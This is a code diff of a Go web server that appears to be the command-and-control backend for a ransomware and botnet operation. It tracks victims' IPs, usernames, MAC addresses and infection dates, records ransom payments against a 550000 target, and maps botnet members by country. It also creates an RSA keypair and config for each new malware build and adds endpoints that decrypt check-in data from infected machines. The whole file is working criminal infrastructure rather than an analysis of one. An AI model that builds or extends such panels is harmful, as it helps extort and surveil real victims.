@@ -44,8 +44,9 @@ type Victim struct{
 	Username string
 	Computer_ram float32
 	Computer_cpu string
-	Computer_status []byte
-	Botnet_status []byte
+	Computer_status int
+	Botnet_status int
+	MacAddress string
 
 }
 
@@ -81,7 +82,7 @@ func GenerateRSA(id int) {
 		Type:  "RSA PRIVATE KEY",
 		Bytes: privateKeyBytes,
 	}
-	privatePem, err := os.Create(string(id)+"_rsa_private_key")
+	privatePem, err := os.Create(strconv.Itoa(id)+"_rsa_private_key")
 	if err != nil {
 		fmt.Printf("error when create private.pem: %s \n", err)
 		os.Exit(1)
@@ -102,7 +103,7 @@ func GenerateRSA(id int) {
 		Type:  "RSA PUBLIC KEY",
 		Bytes: publicKeyBytes,
 	}
-	publicPem, err := os.Create(string(id)+"_rsa_public_key.pub")
+	publicPem, err := os.Create(strconv.Itoa(id)+"_rsa_public_key.pub")
 	if err != nil {
 		fmt.Printf("error when create public.pem: %s \n", err)
 		os.Exit(1)
@@ -146,9 +147,10 @@ func IndexVictim(w http.ResponseWriter, r *http.Request) {
 		var username string
 		var computerRam float32
 		var computerCpu string
-		var computerStatus []byte
-		var botnetStatus []byte
-		err = selDB.Scan(&id, &victimIp, &victimLocalIp ,&computerName,&username,&computerRam,&computerCpu,&computerStatus,&botnetStatus)
+		var computerStatus int
+		var botnetStatus int
+		var mac string
+		err = selDB.Scan(&id, &victimIp, &victimLocalIp ,&computerName,&username,&computerRam,&computerCpu,&computerStatus,&botnetStatus,&mac)
 		if err != nil {
 			panic(err.Error())
 		}
@@ -161,6 +163,7 @@ func IndexVictim(w http.ResponseWriter, r *http.Request) {
 		emp.Computer_cpu = computerCpu
 		emp.Computer_status = computerStatus
 		emp.Botnet_status = botnetStatus
+		emp.MacAddress = mac
 		res = append(res, emp)
 	}
 	_ = tmpl.ExecuteTemplate(w, "IndexVictim", res)
@@ -230,12 +233,18 @@ func InsertVictim(w http.ResponseWriter, r *http.Request) {
 		computer_cpu  := r.FormValue("computer_cpu")
 		computer_status  := r.FormValue("computer_status")
 		botnet_status  := r.FormValue("botnet_status")
+		mac  := r.FormValue("mac-address")
+
 		fmt.Println(id, victimIp,victimLocalIp,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status )
 		insForm, err := db.Prepare("INSERT INTO Victim(id, victim_ip,victim_local_ip,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status ) VALUES(?,?,?,?,?,?,?,?,?)")
 		if err != nil {
 			panic(err.Error())
 		}
-		insForm.Exec(id, victimIp, victimLocalIp, computer_name, username, computer_ram, computer_cpu, computer_status, botnet_status)
+
+		//victim için bi platform eklemesi yapılmış olması lazım onu kontrol edip execute etmek lazım
+		//TODO
+
+		insForm.Exec(id, victimIp, victimLocalIp, computer_name, username, computer_ram, computer_cpu, computer_status, botnet_status, mac)
 	}
 	defer db.Close()
 	http.Redirect(w, r, "/Victims", 301)
@@ -280,30 +289,258 @@ func getJSON(sqlString string) (string, error) {
 		return "", err
 	}
 	fmt.Println(string(jsonData))
+	defer db.Close()
 	return string(jsonData), nil
 }
-
 func getRequested(sqlReq string,w http.ResponseWriter){
 	jsonized ,_ := getJSON(sqlReq)
 	fmt.Println(jsonized)
 	_ = json.NewEncoder(w).Encode(jsonized)
 }
-
-func GetVictimInfo(w http.ResponseWriter , r *http.Request){
-	var body string
-	var data map[string]interface{}
-	err := json.NewDecoder(r.Body).Decode(body)
+func CreateConfig(id int){
+	idString := strconv.Itoa(id)
+	sEncId := b64.StdEncoding.EncodeToString([]byte(idString))
+	fmt.Println(sEncId)
+	err := ioutil.WriteFile(idString+"_config", []byte(sEncId), 0644)
+	cmd1 := exec.Command("mv", idString+"_config"+" /var/www/configs/")
+	if err := cmd1.Run(); err != nil {
+		log.Fatal(err)
+	}
 	check(err)
-	json.Unmarshal([]byte(body),&data)
-	//fmt.Println(reflect.TypeOf(data))
-	//fmt.Println(data)
-	//consider the data is fine
-	vicId := fmt.Sprintf("%v",data["id"])
-	rsaString := fmt.Sprintf("%v",data["info"])
-	var encryptedData  = ReadInfoFromRSA(vicId,rsaString)
-	fmt.Println(encryptedData)
-	// victim info elimizde var şimdi database'e basmak kaldı TODO
+}
 
+func GetID(w http.ResponseWriter, r *http.Request) {
+	debugger("get id method")
+	db := dbConn()
+	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC LIMIT 1")
+	if err != nil {
+		panic(err.Error())
+	}
+	for selDB.Next() {
+		var Id int
+		var MalwareTypeId int
+		var Situation string
+		err = selDB.Scan(&Id, &MalwareTypeId, &Situation)
+		if err != nil {
+			panic(err.Error())
+		}
+		idString := string(Id+1)
+		CreateConfig(Id+1)
+		GenerateRSA(Id+1)
+		moveToLive(idString)
+		moveToVar(idString)
+		debugger(string(Id+1))
+		respond.With(w, r, http.StatusOK, Id+1)
+	}
+
+	defer db.Close()
+}
+
+
+type CountryCount struct {
+	CC string
+	Count string
+}
+
+func GetCountryOld(w http.ResponseWriter, r *http.Request){
+	jsonized ,_ := getJSON("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code ORDER BY count DESC ")
+	fmt.Println(jsonized)
+	fmt.Println(reflect.TypeOf(jsonized))
+
+	db := dbConn()
+	selDB, err := db.Query("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code")
+	if err != nil {
+		panic(err.Error())
+	}
+	var jsonResp string
+	jsonResp = "{"
+	notFirst := false
+	i := 1
+	cTemp := CountryCount{}
+	cArr := []CountryCount{}
+	for selDB.Next(){
+		var count string
+		var cc string
+		if notFirst {
+			jsonResp = jsonResp + ","
+		}
+		err = selDB.Scan(&cc,&count)
+		cTemp.Count = count
+		cTemp.CC = cc
+		cArr = append(cArr, cTemp)
+		if err != nil {
+			panic(err.Error())
+		}
+		notFirst=true
+	}
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Content-Type", "application/json")
+	jsonResp = jsonResp + "}"
+	j2, _ := json.Marshal(cArr)
+	w.Write(j2)
+	//respond.With(w, r, http.StatusOK,(j2) )
+	i = i+1
+	defer db.Close()
+}
+
+func GetCountry(w http.ResponseWriter, r *http.Request){
+	log.Println("GetCountry hit!!")
+	db := dbConn()
+	selDB, err := db.Query("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code")
+	if err != nil {
+		panic(err.Error())
+	}
+	jsonMap := map[string]int{}
+	for selDB.Next(){
+		var count int
+		var cc string
+		err = selDB.Scan(&cc,&count)
+		jsonMap[cc]=count
+	}
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Content-Type", "application/json")
+	respond.With(w, r, http.StatusOK,(jsonMap) )
+	defer db.Close()
+}
+func GetMoney(w http.ResponseWriter, r *http.Request){
+	jsonized ,_ := getJSON("SELECT amount,COUNT(*) as count FROM Money GROUP BY amount ORDER BY count DESC ")
+	respond.With(w, r, http.StatusOK,jsonized)
+}
+
+func TypeCounter(w http.ResponseWriter, r *http.Request) {
+	db := dbConn()
+	selDB, err := db.Query("SELECT attack_vector_type,COUNT(*) as count FROM AttackVector GROUP BY attack_vector_type ORDER BY count DESC")
+	if err != nil {
+		panic(err.Error())
+	}
+	mapper:= map[string]int{}
+	for selDB.Next(){
+		var vector string
+		var count int
+		err = selDB.Scan(&vector,&count)
+		mapper[vector]=count
+	}
+	respond.With(w, r, http.StatusOK,mapper)
+	defer db.Close()
+}
+func GetVictims(w http.ResponseWriter, r *http.Request){
+	db := dbConn()
+	selDB, err := db.Query("SELECT vi.id, vi.victim_ip, vi.username, ms.infected_date,ms.first_touch_with_cc,c.name FROM Victim vi,MalwareStatus ms, Country c, IPWhois ipw WHERE vi.id = ms.id AND vi.victim_ip=ipw.ip AND ipw.country_code = c.code ")
+	if err != nil {
+		panic(err.Error())
+	}
+	MapOfThemAll := map[int]map[string]string{}
+	i := 0
+	for selDB.Next(){
+		jsonMap := map[string]string{}
+		var Id string
+		var ip string
+		var uname string
+		var idate string
+		var tdate string
+		var country string
+		err = selDB.Scan(&Id,&ip,&uname,&idate,&tdate,&country)
+		jsonMap["id"]=Id
+		jsonMap["ip"]=ip
+		jsonMap["username"]=uname
+		jsonMap["infection_date"]=idate
+		jsonMap["first_touch"]=tdate
+		jsonMap["country"]=country
+		MapOfThemAll[i]=jsonMap
+		i++
+	}
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Content-Type", "application/json")
+	respond.With(w, r, http.StatusOK,(MapOfThemAll) )
+	defer db.Close()
+
+}
+func CreatedInfectedInfo(w http.ResponseWriter, r *http.Request){
+	//created-> malware sayısı
+	//infected -> victim sayısı
+	debugger("created infected")
+	db := dbConn()
+	selDB, err := db.Query("SELECT COUNT(*) FROM Malware")
+	if err != nil {
+		panic(err.Error())
+	}
+	var created int
+	for selDB.Next(){
+		err = selDB.Scan(&created)
+		if err != nil {
+			panic(err.Error())
+		}
+	}
+	var infected int
+	selDB, err = db.Query("SELECT COUNT(*) FROM Victim")
+	if err != nil {
+		panic(err.Error())
+	}
+	for selDB.Next(){
+		err = selDB.Scan(&infected)
+		if err != nil {
+			panic(err.Error())
+		}
+	}
+	mapper := map[string]int{}
+	mapper["created"]=created
+	mapper["infected"]=infected
+
+	respond.With(w, r, http.StatusOK, mapper)
+	defer db.Close()
+
+}
+func GetBotnet(w http.ResponseWriter, r *http.Request){
+	log.Println("GetBotnet hit!!")
+	db := dbConn()
+	selDB, err := db.Query("SELECT COUNT(bt.victim_id)as count , c.code FROM Victim vi, Country c, IPWhois ipw,Botnet bt WHERE bt.victim_id = vi.id AND vi.victim_ip=ipw.ip AND ipw.country_code = c.code GROUP BY bt.victim_id ORDER BY count")
+	if err != nil {
+		panic(err.Error())
+	}
+	jsonMap := map[string]int{}
+	for selDB.Next(){
+		var count int
+		var cc string
+		err = selDB.Scan(&count,&cc)
+		jsonMap[cc]=count
+	}
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Content-Type", "application/json")
+	respond.With(w, r, http.StatusOK, jsonMap)
+	defer db.Close()
+}
+func MoneyCounter(w http.ResponseWriter, r *http.Request) {
+	db := dbConn()
+	selDB, err := db.Query("SELECT * FROM Money")
+	if err != nil {
+		panic(err.Error())
+	}
+	odeyen := 0
+	odemeyen := 0
+	toplanan :=0
+	for selDB.Next() {
+		var amount int
+		var status int
+		var malid int
+		err = selDB.Scan(&malid, &amount, &status)
+		if err != nil {
+			panic(err.Error())
+		}
+		if status == 0 {
+			odemeyen++
+		}
+		if status == 0 {
+			odeyen++
+		}
+		toplanan += amount
+	}
+	mapper:=map[string]int{}
+	mapper["paid"] = odeyen
+	mapper["notpaid"] = odemeyen
+	mapper["collected"] = toplanan
+	mapper["target"] = 550000
+	respond.With(w, r, http.StatusOK, mapper)
+	defer db.Close()
 }
 
 func ReadInfoFromRSA(vicId string, infocuk string) []byte {
@@ -339,185 +576,89 @@ func ReadInfoFromRSA(vicId string, infocuk string) []byte {
 	return out
 }
 
+func FirstTouch(w http.ResponseWriter, r *http.Request) {
+	if r.Method == "POST" {
+		id := r.FormValue("id")
+		info := r.FormValue("info")
+		postInfo := ReadInfoFromRSA(id,info)
+		fmt.Println(postInfo)
+		//postInfo bir json
 
-func CreateConfig(id int, version string){
-	idString := strconv.Itoa(id)
-	sEncId := b64.StdEncoding.EncodeToString([]byte(idString))
-	sEncVer := b64.StdEncoding.EncodeToString([]byte(version))
-	fmt.Println(sEncId+"\n"+sEncVer)
-	err := ioutil.WriteFile(idString+"_config", []byte(sEncVer+"\n"+sEncId), 0644)
+		ip := r.Header.Get("X-FORWARDED-FOR")
+		if ip != "" {ip = r.RemoteAddr}
+		fmt.Println(ip)
 
+	}
+}
 
-	cmd1 := exec.Command("mv", idString+"_config"+" /var/www/configs/")
-	if err := cmd1.Run(); err != nil {
-		log.Fatal(err)
+func RSADeneme(w http.ResponseWriter, r *http.Request) {
+	if r.Method == "POST" {
+		mapper := map[string]string{}
+		err := json.NewDecoder(r.Body).Decode(&mapper)
+		if err != nil {panic (err)}
+		fmt.Println(mapper)
+		id2,_ :=strconv.Atoi(mapper["id"])
+		GenerateRSA(id2)
+		//postInfo := ReadInfoFromRSADeneme(id,info)
+		//fmt.Println(postInfo)
+		//postInfo bir json
+
+		ip := r.Header.Get("X-FORWARDED-FOR")
+		if ip != "" {ip = r.RemoteAddr}
+		fmt.Println(ip)
+
+	}
+}
+func ReadInfoFromRSADeneme(vicId string, infocuk string) []byte {
+
+	// Read the private key
+	pemData, err := ioutil.ReadFile("./"+vicId+"_rsa_private_key")
+	if err != nil {
+		log.Fatalf("read key file: %s", err)
 	}
 
+	// Extract the PEM-encoded data block
+	block, _ := pem.Decode(pemData)
+	if block == nil {
+		log.Fatalf("bad key data: %s", "not PEM-encoded")
+	}
+	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
+		log.Fatalf("unknown key type %q, want %q", got, want)
+	}
+
+	// Decode the RSA private key
+	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+	if err != nil {
+		log.Fatalf("bad private key: %s", err)
+	}
+
+	var out []byte
+
+	// Decrypt the data
+	out, err = rsa.DecryptOAEP(sha1.New(), rand.Reader, priv, []byte(infocuk), []byte(""))
+	if err != nil {
+		log.Fatalf("decrypt: %s", err)
+	}
+	return out
+}
+
+func GetVictimInfo(w http.ResponseWriter , r *http.Request){
+	var body string
+	var data map[string]interface{}
+	err := json.NewDecoder(r.Body).Decode(body)
 	check(err)
-}
-
-func GetID(w http.ResponseWriter, r *http.Request) {
-	debugger("get id method")
-	db := dbConn()
-	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC LIMIT 1")
-	if err != nil {
-		panic(err.Error())
-	}
-	for selDB.Next() {
-		var Id int
-		var MalwareTypeId int
-		var Situation string
-		err = selDB.Scan(&Id, &MalwareTypeId, &Situation)
-		if err != nil {
-			panic(err.Error())
-		}
-		idString := string(Id+1)
-		CreateConfig(Id+1,"v1")
-		GenerateRSA(Id+1)
-		moveToLive(idString)
-		moveToVar(idString)
-		//dataenvelope := map[string]interface{}{"code": Id}
-		debugger(string(Id+1))
-		respond.With(w, r, http.StatusOK, Id+1)
-	}
-
+	json.Unmarshal([]byte(body),&data)
+	//fmt.Println(reflect.TypeOf(data))
+	//fmt.Println(data)
+	//consider the data is fine
+	vicId := fmt.Sprintf("%v",data["id"])
+	rsaString := fmt.Sprintf("%v",data["info"])
+	var encryptedData  = ReadInfoFromRSA(vicId,rsaString)
+	fmt.Println(encryptedData)
+	// victim info elimizde var şimdi database'e basmak kaldı TODO
 
 }
 
-func CreatedInfectedInfo(w http.ResponseWriter, r *http.Request){
-	//created-> malware sayısı
-	//infected -> victim sayısı
-	debugger("created infected")
-	db := dbConn()
-	selDB, err := db.Query("SELECT id FROM Malware ORDER BY id DESC LIMIT 1")
-	if err != nil {
-		panic(err.Error())
-	}
-	var created int
-	for selDB.Next(){
-		err = selDB.Scan(&created)
-		if err != nil {
-			panic(err.Error())
-		}
-	}
-	var infected int
-	selDB, err = db.Query("SELECT id FROM Victim ORDER BY id DESC LIMIT 1")
-	if err != nil {
-		panic(err.Error())
-	}
-	for selDB.Next(){
-		err = selDB.Scan(&infected)
-		if err != nil {
-			panic(err.Error())
-		}
-	}
-
-	resp := "{\"created\":"+ strconv.Itoa(created) + ",\"infected\":"+ strconv.Itoa(infected) +"}"
-	respond.With(w, r, http.StatusOK, resp)
-
-}
-
-//func Edit(w http.ResponseWriter, r *http.Request) {
-//	db := dbConn()
-//	nId := r.URL.Query().Get("id")
-//	selDB, err := db.Query("SELECT * FROM Employee WHERE id=?", nId)
-//	if err != nil {
-//		panic(err.Error())
-//	}
-//	emp := Employee{}
-//	for selDB.Next() {
-//		var id int
-//		var name, city string
-//		err = selDB.Scan(&id, &name, &city)
-//		if err != nil {
-//			panic(err.Error())
-//		}
-//		emp.Id = id
-//		emp.Name = name
-//		emp.City = city
-//	}
-//	tmpl.ExecuteTemplate(w, "Edit", emp)
-//	defer db.Close()
-//}
-
-type CountryCount struct {
-	Count string
-	CC string
-}
-
-func GetCountry(w http.ResponseWriter, r *http.Request){
-	jsonized ,_ := getJSON("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code ORDER BY count DESC ")
-	fmt.Println(jsonized)
-	fmt.Println(reflect.TypeOf(jsonized))
-
-	db := dbConn()
-	selDB, err := db.Query("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code")
-	if err != nil {
-		panic(err.Error())
-	}
-	var jsonResp string
-	jsonResp = "{"
-	notFirst := false
-	i := 0
-	for selDB.Next(){
-		var count string
-		var cc string
-		if notFirst {
-			jsonResp = jsonResp + ","
-		}
-		err = selDB.Scan(&cc,&count)
-		jsonResp = jsonResp +cc+":"+ count
-		if err != nil {
-			panic(err.Error())
-		}
-		notFirst=true
-	}
-	w.Header().Set("Access-Control-Allow-Origin", "*")
-	w.Header().Set("Content-Type", "application/json")
-	jsonResp = jsonResp + "}"
-
-	respond.With(w, r, http.StatusOK,(jsonResp) )
-	i = i+1
-}
-
-func GetMoney(w http.ResponseWriter, r *http.Request){
-	jsonized ,_ := getJSON("SELECT amount,COUNT(*) as count FROM Money GROUP BY amount ORDER BY count DESC ")
-	respond.With(w, r, http.StatusOK,jsonized)
-
-}
-
-func TypeCounter(w http.ResponseWriter, r *http.Request) {
-	jsonized ,_ := getJSON("SELECT attack_vector_type,COUNT(*) as count FROM AttackVector GROUP BY attack_vector_type ORDER BY count DESC ")
-	respond.With(w, r, http.StatusOK,jsonized)
-}
-
-type Money struct {
-	Amount int
-	Status int
-}
-
-func MoneyCounter(writer http.ResponseWriter, request *http.Request) {
-	db := dbConn()
-	selDB, err := db.Query("SELECT * FROM Money ORDER BY id DESC")
-	if err != nil {
-		panic(err.Error())
-	}
-	emp := Money{}
-	res := []Money{}
-	for selDB.Next() {
-		var amount int
-		var status int
-		err = selDB.Scan(&amount, &status)
-		if err != nil {
-			panic(err.Error())
-		}
-		emp.Amount = amount
-		emp.Status = status
-		res = append(res, emp)
-	}
-	fmt.Println(res)
-	//TODO
-}
 func main() {
 	log.Println("Server started on: http://localhost:8080")
 	http.HandleFunc("/Malwares", IndexMalware)
@@ -527,16 +668,23 @@ func main() {
 	http.HandleFunc("/getid",GetID)
 	http.HandleFunc("/mangirlar", GetMoney)
 	http.HandleFunc("/bolivar", GetCountry)
-	http.HandleFunc("/dashboard/status/worldmap", GetCountry)
+	http.HandleFunc("/dashboard/status/worldmap-ransomware", GetCountry)
+	http.HandleFunc("/dashboard/status/getallvictims", GetVictims)
 	http.HandleFunc("/dashboard/status/createinfect", CreatedInfectedInfo)
-	http.HandleFunc("/dashboard/status/typescount", TypeCounter)
 	http.HandleFunc("/dashboard/status/paid", MoneyCounter)
+	http.HandleFunc("/dashboard/status/typescount", TypeCounter)
+	http.HandleFunc("/dashboard/status/worldmap-botnet", GetBotnet)
 
-	//http.HandleFunc("/edit", Edit)
+	//not done zone TODO ZONE
+	http.HandleFunc("/api/user/firsttouch", FirstTouch)
+	http.HandleFunc("/api/user/firsttouchdeneme", RSADeneme)
+
 	http.HandleFunc("/new", NewVictim)
 
 	http.ListenAndServe(":8080", nil)
 }
+
+
 
 
 
